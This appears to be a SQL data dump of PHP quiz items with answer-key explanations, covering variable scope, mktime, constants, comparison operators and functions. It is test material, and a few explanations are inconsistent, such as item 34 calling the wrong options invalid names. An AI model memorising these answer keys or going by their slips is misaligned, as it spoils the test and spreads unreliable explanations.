	(24,1,'&nbsp;Consider the following PHP script:','','<p><span>&nbsp;Consider the following PHP script:</span></p>\r\n<p><span><br /></span></p>\r\n<p><span><pre><?php\r\nfunction b($a = 4)\r\n{\r\n  $a = $a / 2;\r\n  return $a;\r\n}\r\n$a = 10;\r\nb($a);\r\necho $a;\r\n?> \r\n</pre></span></p>\r\n<p><span><br /></span></p>\r\n<p><span><span>What will be the output?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option B is correct.</span><br /><br /><span>In the given script, the output will be 10 since the value of variable $a will not be affected by the value of $a inside the function b() (due to function scope). Variable scope describes where in a program\'s text the variable may be used, while the extent (or lifetime) describes when in a program\'s execution a variable has a value. PHP has three types of variable scopes:</span><br /><br /></p>\r\n<ol>\r\n<li><uc:hed>Function Scope:&nbsp;</uc:hed>Variable scope exists within the function where the variable was defined.</li>\r\n<li><uc:hed>Global Scope:&nbsp;</uc:hed>Variable scope exists everywhere in the PHP script.</li>\r\n<li><uc:hed>Class Scope:&nbsp;</uc:hed>Variable scope exists within a class where the variable was defined.</li>\r\n</ol>\r\n<p><uc:iref source=\"wiki\">Answer option A is incorrect. This answer will be displayed when you print the result of the function b(). For this, you will have to execute the following PHP code:</uc:iref></p>\r\n<p><pre><?php\r\nfunction b($a = 4)\r\n{\r\n  $a = $a / 2;\r\n  return $a;\r\n}\r\n$a = 10;\r\nb($a);\r\necho b($a); \r\n?></pre></p>\r\n<p><span>Answer option C is incorrect. This answer would be displayed when you will not pass any argument to the function b(). In this situation, the default argument $a=4 will be passed to the function b(). So, for getting the output 2, you will have to run the following script:</span></p>\r\n<p><span><pre><?php\r\nfunction b($a = 4)\r\n{\r\n  $a = $a / 2;\r\n  return $a;\r\n}\r\n$a = 10;\r\nb($a);\r\necho b();\r\n?> </pre></span></p>\r\n<p><span><br /></span></p>\r\n<p><span><span>Reference:&nbsp;</span><a target=\"_blank\" href=\"http://php.net/manual/en/language.variables.scope.php\" tabindex=\"-1\">http://php.net/manual/en/language.variables.scope.php</a></span></p>',0,'2012-11-18 21:10:18','2012-11-18 21:10:18'),
	(25,1,'Which of the following types of errors ha.....script and cannot be trapped?','','<p><span>Which of the following types of errors halts the execution of a script and cannot be trapped?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>A fatal error is one that halts the execution of a script and cannot be trapped.</span><br /><br /><span>Answer option B is incorrect. A warning is a recoverable error that indicates a run-time fault, but it does not halt the execution of the script.</span><br /><br /><span>Answer option C is incorrect. A notice is an indication that an error condition has occurred, but it is not necessarily significant. It does not halt the execution of the script.</span><br /><br /><span>Answer option D is incorrect. A compile-time error is detected by the parser while it is compiling a script.</span></p>',0,'2012-11-18 21:12:08','2012-11-18 21:12:08'),
	(26,1,'&nbsp;Consider the following script:','','<p><span>&nbsp;Consider the following script:</span></p>\r\n<p><span><br /></span></p>\r\n<p><span><pre><?php\r\n         echo date(\"M-d-Y\", mktime(0, 0, 0, 12, 32, 1995));\r\n?></pre></span></p>\r\n<p><span><br /></span></p>\r\n<p><span><span>What will be the output of the above script?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>Since the given input date is out of range, it will automatically correct it. Hence, the correct answer will be Jan-01-1996.</span></p>\r\n<p><span><span>The&nbsp;</span><b>mktime()</b><span>&nbsp;function is a timestamp function that is useful for date arithmetic and validation. It automatically calculates the correct value for an out-of-range input. The syntax of mktime() is as follows:</span></span></p>\r\n<p><span><span><span class=\"kwd\">int</span><span class=\"pln\"> mktime </span><span class=\"pun\">([</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pln\"> $hour </span><span class=\"pun\">[,</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pln\"> $minute </span><span class=\"pun\">[,</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pln\"> $second </span><span class=\"pun\">[,</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pln\"> $month </span><span class=\"pun\">[,</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pln\"> $day </span><span class=\"pun\">[,</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pln\"> $year </span><span class=\"pun\">[,</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pln\"> $is_dst </span><span class=\"pun\">]]]]]]]</span><span class=\"pln\"> </span><span class=\"pun\">)</span></span></span></p>\r\n<p><span><span><span class=\"pun\"><uc:hed>Note:</uc:hed><span>&nbsp;The range of valid years in the mktime() function is limited to 1970 through 2038 before PHP 5.1.</span></span></span></span></p>',0,'2012-11-18 21:14:07','2012-11-18 21:14:07'),
	(27,1,'Which of the following files can be used .....to modify PHP configurations?','','<p><span>Which of the following files can be used to modify PHP configurations?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.&nbsp;</span><br /><span>The php.ini file is a configuration file in PHP that is used to customize behavior of PHP at runtime. It can customize various settings such as upload directory, register global variables, display errors, log errors, max uploading size setting, and maximum time to execute a script and other configurations. According to php.net, php.ini can be searched in the following locations:</span></p>\r\n<ul>\r\n<li>SAPI module specific location (PHPIniDir directive in Apache 2, -c command line option in CGI and CLI, php_ini parameter in NSAPI, PHP_INI_PATH environment variable in THTTPD)</li>\r\n<li>The PHPRC environment variable.</li>\r\n<li>As of PHP 5.2.0, the location of the php.ini file can be set for different versions of PHP. The following registry keys are examined in order: [HKEY_LOCAL_MACHINE\\SOFTWARE\\PHP\\x.y.z], [HKEY_LOCAL_MACHINE\\SOFTWARE\\PHP\\x.y] and [HKEY_LOCAL_MACHINE\\SOFTWARE\\PHP\\x], where x, y and z mean the PHP major, minor and release versions. If there is a value for IniFilePath in any of these keys, the first one found will be used as the location of the php.ini (Windows only).<br />[HKEY_LOCAL_MACHINE\\SOFTWARE\\PHP], value of IniFilePath (Windows only).<br />Current working directory (except CLI).</li>\r\n</ul>\r\n<p><span>Answer options B, C, and D are incorrect. These are not valid file settings.&nbsp;</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://www.php.net/manual/en/ini.list.php\" tabindex=\"-1\">http://www.php.net/manual/en/ini.list.php</a></uc:ref></p>',0,'2012-11-18 21:15:09','2012-11-18 21:15:09'),
	(28,1,'Which of the following code can be used t.....?','','<p><span>Which of the following code can be used to create case insensitive constant?</span></p>\r\n<p><span><br /></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.&nbsp;</span><br /><br /><span>A constant can be defined by using the define() function. The define function is used to define a named constant. The syntax of the define function is as follows:</span></p>\r\n<p><span><span class=\"kwd\">bool</span><span class=\"pln\"> define </span><span class=\"pun\">(</span><span class=\"pln\"> </span><span class=\"kwd\">string</span><span class=\"pln\"> $name </span><span class=\"pun\">,</span><span class=\"pln\"> mixed $value </span><span class=\"pun\">[,</span><span class=\"pln\"> </span><span class=\"kwd\">bool</span><span class=\"pln\"> $case_insensitive </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"kwd\">false</span><span class=\"pln\"> </span><span class=\"pun\">]</span><span class=\"pln\"> </span><span class=\"pun\">)</span></span></p>\r\n<p><span><span class=\"pun\"><br /></span></span></p>\r\n<p><span><span class=\"pun\"><span>To define the case-sensitive constant, you will write the code like this:</span></span></span></p>\r\n<p><pre><?php\r\ndefine(\"GREETING\",\"How are you today?\");\r\necho constant(\"GREETING\");\r\n?></pre></p>\r\n<p><span><span class=\"pun\"><span><span>To define the case-insensitive constant, you will write the code like this:</span></span></span></span></p>\r\n<p><pre><?php\r\ndefine(\"GREETING\",\"How are you today?\",TRUE);\r\necho constant(\"greeting\");\r\n?></pre></p>\r\n<p><span><span class=\"pun\"><span><span><br /></span></span></span></span></p>\r\n<p><span><span class=\"pun\"><span><span><span>Reference:&nbsp;</span><a target=\"_blank\" href=\"http://php.net/manual/en/language.constants.php\" tabindex=\"-1\">http://php.net/manual/en/language.constants.php</a></span></span></span></span></p>',0,'2012-11-18 21:17:47','2012-11-18 21:46:38'),
	(29,1,'Which of the following are the core exten.....e solution. Choose all that apply.','','<p><span>Which of the following are the core extensions?</span><br /><br /></p>\r\n<div class=\"factinstruction\">Each correct answer represents a complete solution. Choose all that apply.</div>','<p><b>Explanation:</b><span>&nbsp;Answer options A, B and C are correct.&nbsp;</span><br /><br /><span>There are many extensions (addons) to perform specific tasks. These extensions are added in the php.ini configuration file. There are a set of various PHP language elements called core extensions. These extensions are the part of the PHP core, such as arrays, classes, objects, etc.</span><br /><br /><span>Answer option D is incorrect. PECL is a PHP extension community library. It is not the part of the core extension.&nbsp;</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://php.net/manual/en/extensions.membership.php\" tabindex=\"-1\">http://php.net/manual/en/extensions.membership.php</a></uc:ref></p>',0,'2012-11-18 21:18:47','2012-11-18 21:18:47'),
	(30,1,'Which of the following is/are FALSE regar.....LSE regarding OOP in PHP 5.3?','','<p><span>Which of the following is/are FALSE regarding OOP in PHP 5.3?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option D is correct.&nbsp;</span><br /><br /><span>Classes that implement interfaces with methods that have default values in the prototype are no longer required to match the interface\'s default value.</span><br /><br /><span>Answer options A, B, and C are incorrect. These are the true statements.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://in3.php.net/manual/en/language.oop5.changelog.php\" tabindex=\"-1\">http://in3.php.net/manual/en/language.oop5.changelog.php</a></uc:ref></p>',0,'2012-11-18 21:20:03','2012-11-18 21:20:03'),
	(31,1,'What is the value of $x in the following .....\r\n$x = 123 == 0123;\r\n?>','','<p><span>What is the value of $x in the following code snippet?</span></p>\r\n<p><span><br /></span></p>\r\n<p><span><pre><?php\r\n$x = 123 == 0123;\r\n?></pre></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option B is correct.</span><br /><br /><span>There are four types of equivalence operations in the PHP language:</span></p>\r\n<ul>\r\n<li><uc:hed>Equivalence Operation (==):&nbsp;</uc:hed>It evaluates to true if the two operands are equivalent, i.e., they can be converted to a common data type in which they have the same value but are not necessarily of the same type.</li>\r\n<li><uc:hed>Identity Operation (===):&nbsp;</uc:hed>It evaluates to true only if the operands are of the same data type and have the same value.</li>\r\n<li><uc:hed>Not-equivalent Operation (!=):&nbsp;</uc:hed>It evaluates to true if the two operands are not equivalent, without regards to their data type.</li>\r\n<li><uc:hed>Not-identical Operation (!==):&nbsp;</uc:hed>It evaluates to true if the two operands are not of the same data type or do not have the same value.</li>\r\n</ul>\r\n<p><span>In this question, 123 is not equal to 0123, since PHP treats 0123 as octal notification.</span><br /><br /><uc:ref>Reference: PHP Manual,&nbsp;<a target=\"_blank\" href=\"http://php.net/manual/en/language.operators.comparison.php\" tabindex=\"-1\">http://php.net/manual/en/language.operators.comparison.php</a></uc:ref></p>',0,'2012-11-18 21:21:10','2012-11-18 21:21:10'),
	(32,1,'Which of the following options is/are cor.....?\r\n','','<p><span>Which of the following options is/are correct regarding variable scopes in PHP?</span></p>\r\n<p><span><br /></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>Global, function and class scope are the three variable scopes for PHP. Variable scope describes where in a program\'s text the variable may be used, while the extent (or lifetime) describes when in a program\'s execution a variable has a value. PHP has three types of variable scopes:</span><br /><br /></p>\r\n<ol>\r\n<li><uc:hed>Function Scope:&nbsp;</uc:hed>Variable scope exists within the function where the variable was defined.</li>\r\n<li><uc:hed>Global Scope:&nbsp;</uc:hed>Variable scope exists everywhere in the PHP script.</li>\r\n<li><uc:hed>Class Scope:&nbsp;</uc:hed>Variable scope exists within a class where the variable was defined.</li>\r\n</ol>',0,'2012-11-18 21:22:45','2012-11-18 21:22:45'),
	(33,1,'Which of the following features are Undep..... are Undeprecated in PHP 5.3?','','<p><span>Which of the following features are Undeprecated in PHP 5.3?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option D is correct.</span><br /><br /><span>The is_a() function is undeprecated in PHP5.3. The is_a() method checks if the object is of this class or has this class as one of its parents.</span><br /><br /><span>Answer options A, B, and C are incorrect. ereg(), split(), and call-time pass-by-reference are the deprecated features in PHP.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://in3.php.net/manual/en/migration53.undeprecated.php\" tabindex=\"-1\">http://in3.php.net/manual/en/migration53.undeprecated.php</a></uc:ref></p>',0,'2012-11-18 21:23:45','2012-11-18 21:23:45'),
	(34,1,'Which of the following PHP variable names.....is not a valid variable name?','','<p><span>Which of the following PHP variable names is not a valid variable name?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option B is correct.</span><br /><br /><span>Variables in PHP must be named using only letters (a-z,A-Z), the underscore character and numbers. In addition the name must start with either a letter or the underscore character.</span><br /><br /><span>Answer options A, C, and D are incorrect. These are not valid variable names.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://in3.php.net/manual/en/language.variables.php\" tabindex=\"-1\">http://in3.php.net/manual/en/language.variables.php</a></uc:ref></p>',0,'2012-11-18 21:25:20','2012-11-18 21:25:20'),
	(35,1,'What is the result when the following PHP.....ump( (bool) 5.8 );\r\n?> ','','<p><span>What is the result when the following PHP code involving a boolean cast is executed?</span></p>\r\n<p><span><br /></span></p>\r\n<p><span><pre><?php\r\n var_dump( (bool) 5.8 );\r\n?> </pre></span></p>','<p><b><br class=\"Apple-interchange-newline\" />Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>Any number greater than zero when converted to a boolean becomes true. Hence, the following code will output Boolean true.</span></p>\r\n<p><span></span><pre><?php\r\n var_dump( (bool) 5.8 );\r\n?> </pre></p>\r\n<p><span>Reference:&nbsp;</span><a target=\"_blank\" href=\"http://php.net/manual/en/function.var-dump.php\" tabindex=\"-1\">http://php.net/manual/en/function.var-dump.php</a></p>',0,'2012-11-18 21:27:12','2012-11-18 21:27:12'),
	(36,1,'What is the output of the following PHP c.....] * $array[\"FOO\"];\r\n?> ','','<p><span>What is the output of the following PHP code?</span></p>\r\n<p><span><br /></span></p>\r\n<p><span><pre><?php\r\n    define(\'FOO\', 10);\r\n    $array = array(10 => FOO,\"FOO\" => 20);\r\n    print $array[$array[FOO]] * $array[\"FOO\"];\r\n?> </pre></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option C is correct.</span><br /><br /><span>A constant can be defined by using the define() function. The define function is used to define a named constant. The syntax of the define function is as follows:</span></p>\r\n<p><span><span class=\"kwd\">bool</span><span class=\"pln\"> define </span><span class=\"pun\">(</span><span class=\"pln\"> </span><span class=\"kwd\">string</span><span class=\"pln\"> $name </span><span class=\"pun\">,</span><span class=\"pln\"> mixed $value </span><span class=\"pun\">[,</span><span class=\"pln\"> </span><span class=\"kwd\">bool</span><span class=\"pln\"> $case_insensitive </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"kwd\">false</span><span class=\"pln\"> </span><span class=\"pun\">]</span><span class=\"pln\"> </span><span class=\"pun\">)</span></span></p>\r\n<p><span><span class=\"pun\"><br /></span></span></p>\r\n<p><span><span class=\"pun\"><span>To define the case-sensitive constant, you will write the code like this:</span></span></span></p>\r\n<p><span><span class=\"pun\"><span><pre><?php\r\n    define(\"GREETING\",\"How are you today?\");\r\n    echo constant(\"GREETING\");\r\n?></pre></span></span></span></p>\r\n<p><span><span class=\"pun\"><span><span>To define the case-insensitive constant, you will write the code like this:</span></span></span></span></p>\r\n<p><span><span class=\"pun\"><span><span><pre><?php\r\n    define(\"GREETING\",\"How are you today?\",TRUE);\r\n    echo constant(\"greeting\");\r\n?></pre></span></span></span></span></p>\r\n<p><span><span class=\"pun\"><span><span><span>In this question, $array[\"FOO\"] = 20 and $array[$array[FOO]] = 10, because FOO is constant with value 10</span><br /><span>$array[$array[10]] * $array[\"FOO\"];&nbsp;</span><br /><span>so 200.</span></span></span></span></span></p>',0,'2012-11-18 21:29:56','2012-11-18 21:29:56'),
	(37,1,'What does the following function do, when.....c($q, $p % $q);\r\n}\r\n?> ','','<p><span>What does the following function do, when passed two integer values for $p and $q?</span></p>\r\n<p><span><pre><?php\r\nfunction magic($p, $q)\r\n{  \r\n     return ($q == 0)    ? $p    : magic($q, $p % $q);\r\n}\r\n?> </pre></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option D is correct.</span><br /><br /><span>This is ternary if condition is true then calls magic() function passing $q as first argument and mod of $p and $q as second argument, this continues till $q == 0 and returns value of $p. It determines the greatest common divisor between $p and $q.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://in3.php.net/manual/en/language.operators.comparison.php\" tabindex=\"-1\">http://in3.php.net/manual/en/language.operators.comparison.php</a></uc:ref></p>',0,'2012-11-18 21:31:20','2012-11-18 21:31:20'),
	(38,1,'What is the output of the following code .....function(40) + $c;\r\n?> ','','<p><span>What is the output of the following code snippet?</span></p>\r\n<p><span><br /></span></p>\r\n<p><span><pre><?php\r\n$a = 20;\r\nfunction myfunction($b) {\r\n    $a = 30;\r\n    global $a, $c;\r\n    return $c = ($b + $a);\r\n}\r\nprint myfunction(40) + $c;\r\n?> </pre></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>In this question, comments are explaining code:</span></p>\r\n<p><span><pre><?php\r\n$a = 20;\r\nfunction myfunction($b) {\r\n    $a = 30;\r\n    global $a, $c;\r\n    return $c = ($b + $a); //40+ 20 (global)\r\n}\r\nprint myfunction(40) + $c; //60+60 ($c = global) \r\n?></pre></span></p>',0,'2012-11-18 21:33:21','2012-11-18 21:33:21'),
	(39,1,'Which of the following statements is/are .....E regarding functions in PHP?','','<p><span>Which of the following statements is/are FALSE regarding functions in PHP?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.&nbsp;</span><br /><br /><span>All functions in PHP return a value - even if you don\'t explicitly cause them to. Thus, the concept of void functions does not really apply to PHP.</span></p>',0,'2012-11-18 21:35:07','2012-11-18 21:35:07'),
	(40,1,'Which of the below provided options is co....._dump ($a == $c); \r\n?> ','','<p><span>Which of the below provided options is correct regarding the below code?</span></p>\r\n<p><span><br /></span></p>\r\n<p><span><pre><?php \r\n    $a = array (1, 2, 3);\r\n    $b = array (1 => 2, 2 => 3, 0 => 1); \r\n    $c = array (\'a\' => 1, \'b\' => 2, \'c\' => 3);\r\n    var_dump ($a == $b); \r\n    var_dump ($a === $b); \r\n    var_dump ($a == $c); \r\n?> </pre></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option C is correct.</span><br /><br /><span>The equivalence operator == returns true if both arrays have the same number of elements with the same values and keys, regardless of their order. The identity operator ===, on the other hand, returns true only if the array contains the same key/value pairs in the same order.</span><br /><br /><span>var_dump ($a == $b); // True</span><br /><span>var_dump ($a === $b); // False</span><br /><span>var_dump ($a == $c); // False</span></p>',0,'2012-11-18 21:37:02','2012-11-18 21:37:02'),
	(41,1,'What does the following code snippet do?','','<p><span>What does the following code snippet do?</span></p>\r\n<p><span><pre><?php\r\n\r\n$a = `ls -l`;\r\n\r\n?></pre></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.&nbsp;</span><br /><br /><span>The backtick operator makes it possible to execute a shell command and retrieve its output. So, $a will store the contents of the current working directory.&nbsp;</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://php.net/manual/en/language.operators.execution.php\" tabindex=\"-1\">http://php.net/manual/en/language.operators.execution.php</a></uc:ref></p>',0,'2012-11-18 21:38:31','2012-11-18 21:38:31'),
	(42,1,'Which one of the following four logical o.....erators of PHP is not binary?','','<p><span>Which one of the following four logical operators of PHP is not binary?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>Logical NOT is unary but not binary operator.&nbsp;</span><br /><br /><span>Answer option B is incorrect. The AND operator is a binary operator.</span><br /><br /><span>Answer option C is incorrect. The OR operator is a binary operator.</span><br /><br /><span>Answer option D is incorrect. The XOR operator is a binary operator.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://php.net/manual/en/language.operators.logical.php\" tabindex=\"-1\">http://php.net/manual/en/language.operators.logical.php</a></uc:ref></p>',0,'2012-11-18 21:39:56','2012-11-18 21:39:56'),
	(43,2,'Which of the following is the correct nam.....on of user defined functions?','','<p><span>Which of the following is the correct naming convention of user defined functions?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>Function name can be started only by letters and underscore( _ ), not with a number. A function is a set of actions defined by a user, which affects one or more objects as per the definition. The function block starts with the function keyword. Functions, once created, can be reused in other parts of the document. The syntax for defining a function is as follows:</span></p>\r\n<p><span><br /></span></p>\r\n<p><span><pre><?php\r\nfunction functionname()\r\n{\r\n   //Statements\r\n}\r\n?></pre></span></p>\r\n<p><span><br /></span></p>\r\n<p><span><span>Answer options B, C, and D are incorrect. These are not valid function names.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://in2.php.net/manual/en/language.functions.php\" tabindex=\"-1\">http://in2.php.net/manual/en/language.functions.php</a></uc:ref></span></p>',0,'2012-11-18 22:08:32','2012-11-18 22:08:32'),
	(44,2,'Which of the following statements will re.....rameter passed to a function?','','<p><span>Which of the following statements will return the second parameter passed to a function?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option B is correct.</span><br /><br /><span>func_get_arg() returns an item from the argument list. In this, for fetching the first argument, you have to use func_get_arg(0); for fetching the second argument, you have to use func_get_arg(1), and so on.</span><br /><br /><span>Answer options A, C, and D are incorrect. These are not valid answers.</span></p>\r\n<p><span><span>PHP provides three built-in functions to handle variable-length argument lists, which are as follows:</span></span></p>\r\n<ol>\r\n<li><uc:hed>func_num_args():</uc:hed>&nbsp;It returns the number of arguments passed to the function.</li>\r\n<li><uc:hed>func_get_arg():</uc:hed>&nbsp;It returns an item from the argument list.</li>\r\n<li><uc:hed>func_get_args():</uc:hed>&nbsp;It returns an array in which each element is a copy of the corresponding member of the current user-defined function\'s argument list.</li>\r\n</ol>\r\n<div><span>Reference:&nbsp;</span><a target=\"_blank\" href=\"http://in2.php.net/manual/en/function.func-get-arg.php\" tabindex=\"-1\">http://in2.php.net/manual/en/function.func-get-arg.php</a></div>\r\n<p><span><br /></span></p>',0,'2012-11-18 22:10:10','2012-11-18 22:10:10'),
	(45,2,'Consider the following script:.....at will be the output?','','<p><span>Consider the following script:</span></p>\r\n<p><span><br /></span></p>\r\n<p><span><pre><?php\r\n$a = array(\'a\', \'b\'); \r\narray_push($a, array(1,2)); \r\nprint_r($a);\r\n?></pre></span></p>\r\n<p><span><br /></span></p>\r\n<p><span><span>What will be the output?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option D is correct.</span><br /><br /><span>The array_push() function is used to insert one or more elements to the end of an array. So, the output of this script will be:</span></p>\r\n<p><span><span class=\"pln\">array</span><span class=\"pun\">(</span><span class=\"str\">\'a\'</span><span class=\"pun\">,</span><span class=\"pln\"> </span><span class=\"str\">\'b\'</span><span class=\"pun\">,</span><span class=\"pln\"> array</span><span class=\"pun\">(</span><span class=\"lit\">1</span><span class=\"pun\">,</span><span class=\"pln\"> </span><span class=\"lit\">2</span><span class=\"pun\">))</span></span></p>\r\n<p><span><span class=\"pun\"><br /></span></span></p>\r\n<p><span><span class=\"pun\"><span>Answer option A is incorrect. For this output, you will have to write the following PHP script:</span></span></span></p>\r\n<p><pre><?php\r\n$a = array(\'a\', \'b\'); \r\narray_push($a, 1,2); \r\nprint_r($a);\r\n?></pre></p>\r\n<p><span>Answer option B is incorrect. For this output, you will have to write the following PHP script:</span></p>\r\n<p><pre><?php\r\n$a = array(\'a\', \'b\'); \r\narray_pop($a, 1,2); \r\nprint_r($a);\r\n?></pre></p>\r\n<p><span>Answer option C is incorrect. For this output, you will have to write the following PHP script:</span></p>\r\n<p><span><pre><?php\r\n$a = array(\'a\', \'b\'); \r\narray_pop($a, array(1,2)); \r\nprint_r($a);\r\n?></pre></span></p>\r\n<p><span><br /></span></p>\r\n<p><span><span>Reference:&nbsp;</span><a target=\"_blank\" href=\"http://php.net/manual/en/function.array-push.php\" tabindex=\"-1\">http://php.net/manual/en/function.array-push.php</a></span></p>',0,'2012-11-18 22:13:10','2012-11-18 22:13:10'),
	(46,2,'You want to create an anonymous function .....iv>\r\n','','<p><span>You want to create an anonymous function in the middle of a script that will return the square of a given number. Which of the following PHP scripts can you use to accomplish the task?</span><br /><br /></p>\r\n<div class=\"factinstruction\">Each correct answer represents a complete solution. Choose two.</div>\r\n<div class=\"factinstruction\"></div>','<p><b>Explanation:</b><span>&nbsp;Answer options A and B are correct.</span><br /><br /><span>The create_function() function is used to create an anonymous function in PHP. This function call creates a new randomly named function and returns its name (as a string). Consider the following example:</span></p>\r\n<p><span><pre><?php\r\n      $foo = create_function(\'$x\', \'return $x*$x;\');\r\n      $bar = create_function(\"\\$x\", \"return \\$x*\\$x;\");\r\n      echo $foo(10); \r\n?></pre></span></p>\r\n<p><span><span>It is important to note that the argument list and function body must be in single quotes or the dollar signs must be escaped. Otherwise PHP will assume \"$x\" means the variable $x and will substitute it into the string (despite possibly not existing) instead of leaving \"$x\" in the string. For functions with quotes or functions with lots of variables, it can get quite tedious to ensure the intended function body is what PHP interprets.</span><br /><br /><span>Answer options C and D are incorrect. These are not valid answers according to the script.</span></span></p>',0,'2012-11-18 22:15:49','2012-11-18 22:15:49'),
	(47,2,'Consider the following PHP script:.....at will be the output?','','<p><span>Consider the following PHP script:</span></p>\r\n<p><span><pre><?php\r\n$a = 5;\r\n$b = 10;\r\nfunction Mul()\r\n{\r\n    $GLOBALS[\'b\'] = $GLOBALS[\'a\'] * $GLOBALS[\'b\'];\r\n}\r\nMul();\r\nprint($b);\r\n?> </pre></span></p>\r\n<p><span><br /></span></p>\r\n<p><span><span>What will be the output?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The $GLOBALS array is an associative array containing the references of all variables that are currently defined in the global scope of a PHP script. Consider the following example:</span></p>\r\n<p><span><pre><?php\r\n$a = 5;\r\n$b = 10;\r\nfunction Mul()\r\n{\r\n    $GLOBALS[\'b\'] = $GLOBALS[\'a\'] * $GLOBALS[\'b\'];\r\n}\r\nMul(); \r\nprint($b); //output will be 50.\r\n?> </pre></span></p>\r\n<p><span><span>Answer options B, C, and D are incorrect. These are not valid output for this script.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://in3.php.net/manual/en/reserved.variables.globals.php\" tabindex=\"-1\">http://in3.php.net/manual/en/reserved.variables.globals.php</a></uc:ref></span></p>',0,'2012-11-18 22:17:25','2012-11-18 22:17:25'),
	(48,2,'Which of the following options about retu.....out return statement is true?','','<p><span>Which of the following options about return statement is true?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>You can use the return statement to let a function return a value. You can return any type including arrays and objects. The return statement ends the functions execution and passes control back to the line from which the function was called. The following code explains the working of the return statement:</span></p>\r\n<p><span><pre><?php\r\nfunction add($x,$y)\r\n{\r\n   $x = $x+$y;\r\n   return $x; // ends the functions execution and passes control back\r\n}\r\necho \"1 + 16 = \" . add(1,16); //output will be 1 + 16 = 17\r\n?></pre></span></p>\r\n<p><span><span>Answer options B, C, and D are incorrect. These are not valid details for return statement. Return statement works with anonymous functions.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://in3.php.net/manual/en/function.return.php\" tabindex=\"-1\">http://in3.php.net/manual/en/function.return.php</a></uc:ref></span></p>',0,'2012-11-18 22:24:25','2012-11-18 22:24:25'),
	(49,2,'&nbsp;Consider the following PHP script:','','<p><span>&nbsp;Consider the following PHP script:</span></p>\r\n<p><span><pre><?php\r\n$a = 5; \r\n$b = 10; \r\n \r\nfunction Mul()\r\n{\r\n    ********************** \r\n} \r\n \r\nMul();\r\nprint($b); \r\n?> </pre></span></p>\r\n<p><span><span>What can you write instead of ****** on line 7 to get the output 50?</span><br /><br /></span></p>\r\n<div class=\"factinstruction\">Each correct answer represents a complete solution. Choose all that apply.</div>\r\n<p><span><br /></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer options A and B are correct.</span><br /><br /><span>You can use either the $GLOBALS array or global keyword to make $a and $b the global scope. The $GLOBALS array is an associative array containing the references of all variables that are currently defined in the global scope of a PHP script. Consider the following example:</span></p>\r\n<p><span><pre><?php\r\n$a = 5;\r\n$b = 10;\r\nfunction Mul()\r\n{\r\n    $GLOBALS[\'b\'] = $GLOBALS[\'a\'] * $GLOBALS[\'b\'];\r\n}\r\nMul();\r\nprint($b);\r\n?> </pre></span></p>\r\n<p><span><span>The global keyword is used to make a variable scope global. Consider the following PHP script:</span></span></p>\r\n<p><span><span><pre><?php\r\n$a = 5;\r\n$b = 10;\r\nfunction Mul()\r\n{\r\n    global $a, $b;\r\n   $b = $a * $b;\r\n}\r\nMul();\r\nprint($b);\r\n?> </pre></span></span></p>\r\n<p><span><span><span>The output of the above script is 50. When a user declares variables $a and $b global within the function, all references of these variables refer to their global version.</span><br /><br /><span>Answer options C and D are incorrect. These are not valid answer options.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://php.net/manual/en/language.variables.scope.php\" tabindex=\"-1\">http://php.net/manual/en/language.variables.scope.php</a></uc:ref></span></span></p>',0,'2012-11-18 22:27:19','2012-11-18 22:27:19'),
